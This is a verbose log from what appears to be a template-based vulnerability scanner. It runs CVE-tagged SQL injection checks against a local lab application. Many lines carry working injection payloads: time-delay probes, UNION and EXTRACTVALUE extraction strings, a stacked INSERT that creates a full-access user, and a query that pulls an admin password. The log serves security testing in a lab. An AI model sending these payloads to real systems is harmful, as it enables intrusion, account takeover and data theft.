+[VER] [CVE-2023-40931] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/nagiosxi/login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-48084] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/nagiosxi/login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-4490] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-job-portal-jobseeker-controlpanel/jobs?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-34362] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/moveitisapi/moveitisapi.dll?id=1&id=1&Submit=Submit&Submit=Submit&action=m2
+[VER] [CVE-2023-45826] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/jsonrpc?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-4974] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/tutor/filter?id=1&id=1&Submit=Submit&Submit=Submit&searched_word&searched_tution_class_type[]=1&price_min=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&price_max=9&searched_price_type[]=hourly&searched_duration[]=0
+[WRN] [CVE-2023-40931] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: nsp,username,password
+[VER] [CVE-2023-43374] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/hoteldruid/inizio.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-13322] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-1751] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/courses/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-46347] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/modules/ndk_steppingpack/search-result.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-50839] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/js-support-ticket-controlpanel/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-5652] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-6567] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/lp/v1/courses/archive-course?id=1&id=1&Submit=Submit&Submit=Submit&order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1
+[VER] [CVE-2023-7337] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/js-support-ticket-controlpanel/?id=1&id=1&Submit=Submit&Submit=Submit&jstmod=ticket&jstlay=ticketdetail&jssupportticketid=1
+[VER] [CVE-2023-48084] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/nagiosxi/login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-13979] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/erp/dwr/call/plaincall/SingleRowQueryConvertor.queryForString.dwr?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-43373] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-22476] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/task/submit/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-1698] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/notificationx/v1/analytics?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-46347] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/modules/ndk_steppingpack/search-result.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-24112] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/item/list?id=1&id=1&Submit=Submit&Submit=Submit&draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,1ac1950d41c10ebcba12545ca0d20d89,0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D&search%5Bregex%5D=false&cid=-1&_=1
+[VER] [CVE-2024-2621] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/client/user/pwd_update.php?id=1&id=1&Submit=Submit&Submit=Submit&usr_number=1%27%20AND%20(SELECT%207872%20FROM%20(SELECT(SLEEP(6)))DHhu)%20AND%20%27pMGM%27=%27pMGM&new_password=1&sign=1
+[VER] [CVE-2024-27956] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/wp-automatic/inc/csv.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-27718] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/importexport.php?id=1&id=1&Submit=Submit&Submit=Submit&sql=c2VsZWN0KzksbWQ1KDk4NzE4NDApLDk=&type=exportexcelbysql
+[VER] [CVE-2023-50839] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/js-support-ticket-controlpanel/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-2876] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-post.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-2330] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/protocol/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-31750] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/pr_monitor/getting_index_data.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-30490] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-48084] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/nagiosxi/index.php/admin/banner_message-ajaxhelper.php?id=1&id=1&id=(SELECT+CASE+WHEN+1=1+THEN+sleep(5)+ELSE+sleep(0)+END+)&Submit=Submit&Submit=Submit&action=acknowledge_banner_message
+[VER] [CVE-2024-2879] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/LayerSlider/assets/static/public/front.css?id=1&Submit=Submit
+[VER] [CVE-2024-30498] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-29824] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/WSStatusEvents/EventHandler.asmx?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-34362] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/guestaccess.aspx?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-12025] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/collapsing-categories/v1/get?id=1&id=1&Submit=Submit&Submit=Submit&showPosts=1&taxonomy=category%27%29+AND+(SELECT+1+FROM+(SELECT(SLEEP(8)))a)--+-
+[VER] [CVE-2024-11728] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-32709] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/account/?id=1&id=1&Submit=Submit&Submit=Submit&user=1&tab=groups&group-name=p%27+or+%27%%27=%27%%27+union+all+select+1,2,3,4,5,6,7,8,9,10,11,concat(%22Database:%22,md5(999999999),0x7c,%20%22Version:%22,version()),13--+-
+[VER] [CVE-2024-32231] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/graphql?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-13726] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-33288] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/Admin/login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-32640] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.cfm/_api/json/v1/default/?id=1&id=1&Submit=Submit&Submit=Submit&method=processAsyncObject
+[VER] [CVE-2024-3605] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/wphb/v1/rooms/search-rooms?id=1&id=1&Submit=Submit&Submit=Submit&check_in_date=2025-01-01&check_out_date=2025-01-10&adults=4&max_child=0&paged=1&room_type=1
+[VER] [CVE-2024-13496] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-37843] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2024-13496] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: nonce
+[VER] [CVE-2024-30502] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/trip/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-38289] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/as/wapi/vmp?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2024-35584] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2024-33288] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/Admin/index.php?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2024-39907] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2024-3922] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/dokan-pro/changelog.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-38289] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/as/wapi/vmp?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-39887] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/login/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-35286] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/npm-pwg/..;/npm-admin/login.do?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2024-39887] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: csrf_token,username,password
+[VER] [CVE-2024-11305] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php/display/status_zigbee?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-4257] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/login.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-43360] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/zm/index.php?id=1&id=1&Submit=Submit&Submit=Submit&sort=if(now()=sysdate()%2Csleep(6)%2C0)&order=desc&limit=20&view=request&request=watch&mid=1
+[VER] [CVE-2024-39250] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/Login.aspx?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2024-43965] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2024-1512] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit&rest_route=/lms/stm-lms/order/items&author_id=1&user=1)+AND+%28SELECT+3493+FROM+%28SELECT%28SLEEP%286%29%29%29sauT%29+AND+%283071%3D3071
+[WRN] [CVE-2024-47062] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2024-39887] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v1/chart/data?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-4443] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/business-directory/?id=1&id=1&Submit=Submit&Submit=Submit&dosrch=1&q&wpbdp_view=search&listingfields[+or+sleep(if(1%3d1,6,0))+))--+-][1]
+[WRN] [CVE-2024-47062] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: auth_token
+[VER] [CVE-2024-0705] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-45622] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/asispanel/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-44349] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/default.aspx?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-48307] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/jeecg-boot/drag/onlDragDatasetHead/getTotalData?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-51211] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/ResetUserInfo.php?id=1&id=1&Submit=Submit&Submit=Submit&user_type_form=username&uname_user_type=uname_student&username_stn_id=21+OR+3720%3dBENCHMARK(7000000,MD5(0x6e48446e))&pass=1&month_username_dob=x&day_username_dob=x&year_username_dob=x
+[VER] [CVE-2024-5057] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/easy-digital-downloads/readme.txt?id=1&Submit=Submit
+[WRN] [CVE-2024-5315] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2024-10400] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit
+[VER] [CVE-2024-5276] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/workflow/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-48307] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/drag/onlDragDatasetHead/getTotalData?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2024-10400] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: nonce
+[WRN] [CVE-2024-5276] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: jsessionid
+[VER] [CVE-2024-6028] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-51228] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/boafrm/formSysCmd?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2024-5276] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: anonurl
+[VER] [CVE-2024-5827] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v0/train?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-5276] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/workflow/servlet/pdf_servlet?id=1&id=1&Submit=Submit&Submit=Submit&JOBID=1'%3BINSERT%20INTO%20DOCTERA_USERS%20(USERNAME%2C%20PASSWORD%2C%20ENCPASSWORD%2C%20FIRSTNAME%2C%20LASTNAME%2C%20COMPANY%2C%20ADDRESS%2C%20ADDRESS2%2C%20CITY%2C%20STATE%2C%20ALTPHONE%2C%20ZIP%2C%20COUNTRY%2C%20PHONE%2C%20FAX%2C%20EMAIL%2C%20LASTLOGIN%2C%20CREATION%2C%20PREFERREDSERVER%2C%20CREDITCARDTYPE%2C%20CREDITCARDNUMBER%2C%20CREDITCARDEXPIRY%2C%20ACCOUNTSTATUS%2C%20USERTYPE%2C%20COMMENT%2C%20ADMIN%2C%20SUPERADMIN%2C%20ACCEPTEMAIL%2C%20ALLOWHOTFOLDER%2C%20PROTOCOL%2C%20BANDWIDTH%2C%20DIRECTORY%2C%20SLOWSTARTRATE%2C%20USESLOWSTART%2C%20SLOWSTARTAGGRESSIONRATE%2C%20BLOCKSIZE%2C%20UNITSIZE%2C%20NUMENCODERS%2C%20NUMFTPSTREAMS%2C%20ALLOWUSERBANDWIDTHTUNING%2C%20EXPIRYDATE%2C%20ALLOWTEMPACCOUNTCREATION%2C%20OWNERUSERNAME%2C%20USERLEVEL%2C%20UPLOADMETHOD%2C%20PW_CHANGEABLE%2C%20PW_CREATIONDATE%2C%20PW_DAYSBEFOREEXPIRE%2C%20PW_MUSTCHANGE%2C%20PW_USEDPASSWORDS%2C%20PW_NUMERRORS)%20VALUES('3eokvxysctparkj3ljqgw32k6rl'%2C%20NULL%2C%20'012321026D06C4D8CB67A41F25DBFE09'%2C%20'3eokvxysctparkj3ljqgw32k6rlFirstName'%2C%20'3eokvxysctparkj3ljqgw32k6rlLastName'%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%20'202-404-2400'%2C%20''%2C%20'3eokvxysctparkj3ljqgw32k6rl%40mydomain.local'%2C%201714014839723%2C%201714013661166%2C%20'default'%2C%20''%2C%20''%2C%20''%2C%20'full%20access'%2C%20''%2C%20''%2C%201%2C%200%2C%200%2C%200%2C%20'DEFAULT'%2C%20'0'%2C%200%2C%20'0'%2C%201%2C%20''%2C%20''%2C%20''%2C%20''%2C%20''%2C%200%2C%200%2C%200%2C%20''%2C%200%2C%20'DEFAULT'%2C%200%2C%201714014752270%2C%20-1%2C%200%2C%20NULL%2C%200)%3B--%20-
+[VER] [CVE-2024-6265] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/users/?id=1&id=1&Submit=Submit&Submit=Submit&uwp_sort_by=display_name,(SELECT+SLEEP(6))_asc
+[VER] [CVE-2024-6670] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/NmConsole/WugSystemAppSettings/JMXSecurity?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-6265] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/all-users/?id=1&id=1&Submit=Submit&Submit=Submit&uwp_sort_by=display_name,(SELECT+SLEEP(6))_asc
+[VER] [CVE-2024-6671] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/NmConsole/WugSystemAppSettings/JMXSecurity?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-6265] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/member-directory/?id=1&id=1&Submit=Submit&Submit=Submit&uwp_sort_by=display_name,(SELECT+SLEEP(6))_asc
+[VER] [CVE-2024-6265] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/members/?id=1&id=1&Submit=Submit&Submit=Submit&uwp_sort_by=display_name,(SELECT+SLEEP(6))_asc
+[VER] [CVE-2024-5276] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/workflow/jsp/logon.jsp?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-6265] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/user-list/?id=1&id=1&Submit=Submit&Submit=Submit&uwp_sort_by=display_name,(SELECT+SLEEP(6))_asc
+[WRN] [CVE-2024-5276] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: fcweb_token
+[VER] [CVE-2024-6670] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/NmConsole/Platform/PerformanceMonitorErrors/HasErrors?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-6671] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/NmConsole/Platform/Filter/DeviceStatisticalMonitors?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-6265] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/directory/?id=1&id=1&Submit=Submit&Submit=Submit&uwp_sort_by=display_name,(SELECT+SLEEP(6))_asc
+[VER] [CVE-2024-6670] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/NmConsole/Platform/Filter/AlertCenterItemsReportThresholds?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-6671] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/NmConsole/Platform/Filter/AlertCenterItemsReportThresholds?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2024-6670] Could not execute step on http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: cause="TypeError: Cannot read property 'replace' of undefined or null at <eval>:5:22(18)" chain="failed to execute flow\nhttp(1);\nhttp(2);\nhttp(3);\nencryptedPassword = template.encryptedPassword\nconst cleanedInput = encryptedPassword.replace('psyduck', '').match(/\\d+/g);\nconst hexValues = cleanedInput.map(value => {\n  const num = parseInt(value);\n  return isNaN(num) ? '00' : num.toString(16).padStart(2, '0');\n});\nlog(hexValues);\nconst hexString = hexValues.join('');\nconst varbinaryString = '0x' + hexString;\nset(\"encryptedPassword\", varbinaryString);\nhttp(4) && http(5);"
+[WRN] [CVE-2024-6671] Could not execute step on http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: cause="TypeError: Cannot read property 'replace' of undefined or null at <eval>:5:22(18)" chain="failed to execute flow\nhttp(1);\nhttp(2);\nhttp(3);\nencryptedPassword = template.encryptedPassword\nconst cleanedInput = encryptedPassword.replace('psyduck', '').match(/\\d+/g);\nconst hexValues = cleanedInput.map(value => {\n  const num = parseInt(value);\n  return isNaN(num) ? '00' : num.toString(16).padStart(2, '0');\n});\nconst hexString = hexValues.join('');\nconst varbinaryString = '0x' + hexString;\nset(\"encryptedPassword\", varbinaryString);\nhttp(4) && http(5);"
+[VER] [CVE-2024-7188] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/listing?id=1&id=1&Submit=Submit&Submit=Submit&cat=6&filter=1&job-type=1&keywords=Mr.&location=1&order=desc&placeid=US&placetype=country&range1=1&range2=1)%20AND%20(SELECT%201864%20FROM%20(SELECT(SLEEP(6)))gOGh)%20AND%20(6900=6900&salary-type=1&sort=id&subcat
+[VER] [CVE-2023-5203] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&id=1%27%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%287%29%29%29test%29%20--%20&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-6655] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit
+[VER] [CVE-2024-8503] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/vicidial/welcome.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2023-45375] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-8522] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/learnpress/v1/courses?id=1&id=1&Submit=Submit&Submit=Submit&course_filter&c_only_fields=post_title,(select(sleep(6))),ID
+[WRN] [CVE-2024-8625] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2024-8529] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/learnpress/readme.txt?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2024-9264] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2024-9465] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/bin/configurations/parsers/Checkpoint/CHECKPOINT.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2025-10090] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/C6/Jhsoft.Web.departments/GetTreeDate.aspx/?id=1&id=1&id=1;WAITFOR+DELAY+'0:0:6'--&Submit=Submit&Submit=Submit
+[WRN] [CVE-2025-1023] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2025-13138] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-1061] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&id=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-&Submit=Submit&Submit=Submit&rest_route=/h5vp/v1/view/1
+[WRN] [CVE-2025-13652] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: username,password
+[VER] [CVE-2025-14124] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-content/plugins/tlp-team/assets/css/tlpteam.css?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2025-2010] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: jobid
+[VER] [CVE-2025-2011] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit&s=9999')union+select+111,222,(select(concat(0x44617461626173653a20,database()))),4444,+5--+-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index
+[VER] [CVE-2024-30163] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit&/store/
+[VER] [CVE-2025-22214] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/Message/fi_message_receiver.aspx?id=1&id=1&Submit=Submit&Submit=Submit&replyid=1%20and%201=CONVERT(VARCHAR(32),HASHBYTES('MD5','123'),2)--+
+[VER] [CVE-2025-2221] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2025-22785] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2024-36412] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/index.php?id=1&id=1&Submit=Submit&Submit=Submit&entryPoint=responseEntryPoint&event=1&delegate=a<"+UNION+SELECT+SLEEP(6);--+-&type=c&response=accept
+[VER] [CVE-2025-25257] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/fabric/device/status?id=1&id=1&Submit=Submit&Submit=Submit
+[WRN] [CVE-2025-27892] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: token
+[VER] [CVE-2025-29085] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/console/dashboard/executorCount?id=1&id=1&Submit=Submit&Submit=Submit&zkClusterKey=1%27-extractvalue(1,concat(0x0a,version()))--%20-
+[VER] [CVE-2025-32814] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/netmri/config/userAdmin/login.tdf?id=1&id=1&Submit=Submit&Submit=Submit&skipjackUsername=admin%22+AND+updatexml(rand(),concat(CHAR(126),NetmriDecrypt((select%20PasswordSecure%20from%20skipjack.ACLUser%20where%20UserName=%22admin%22),%22password%22,1),CHAR(126)),null)--%22&skipjackPassword=anything&weakPassword=true&eulaAccepted=Accept&mode=DO-LOGIN
+[VER] [CVE-2025-32969] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/rest/wikis/xwiki/query?id=1&id=1&Submit=Submit&Submit=Submit&q=where%20doc.name=length(%27a%27)*org.apache.logging.log4j.util.Chars.SPACE%20or%201%3C%3E%271%5C%27%27%20union%20select%201,2,3,sleep(7)%20%23%27&type=hql&distinct=0
+[VER] [CVE-2025-48281] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/designs/?id=1&id=1&Submit=Submit&Submit=Submit&orderby=(SELECT+42+FROM+(SELECT(SLEEP(7)))test)
+[VER] [CVE-2024-8911] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit
+[VER] [CVE-2024-9186] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2025-5287] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-admin/admin-ajax.php?id=1&id=1&Submit=Submit&Submit=Submit
+[VER] [CVE-2025-54726] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/wp-json/jalw/v1/archive?id=1&id=1&Submit=Submit&Submit=Submit&cats=if(now()=sysdate(),SLEEP(6),0)&exclusionType=exclude
+[VER] [CVE-2025-1323] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit
+[VER] [CVE-2025-5569] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v1.index.article/getList.html?id=1&id=1&Submit=Submit&Submit=Submit&field=id,md5(999999999)&size=1&cat=3&time_stamp=1781864476
+[WRN] [CVE-2025-1323] Could not make http request for http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit: unresolved variables found: nonce
+[VER] [CVE-2025-57819] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/admin/ajax.php?id=1&Submit=Submit&module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+
+[VER] [CVE-2025-5569] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/api/v1.index.goods/getList.html?id=1&id=1&Submit=Submit&Submit=Submit&field=id,md5(999999999)&activity_type=hot&time_stamp=1781864476
+[VER] [CVE-2025-6403] Sent HTTP request to http://localhost:4280/vulnerabilities/sqli/student.php?id=1&id=1&id=1'+AND+EXTRACTVALUE(0x0a,CONCAT(0x0a,VERSION()))--+-&Submit=Submit&Submit=Submit&action=delete
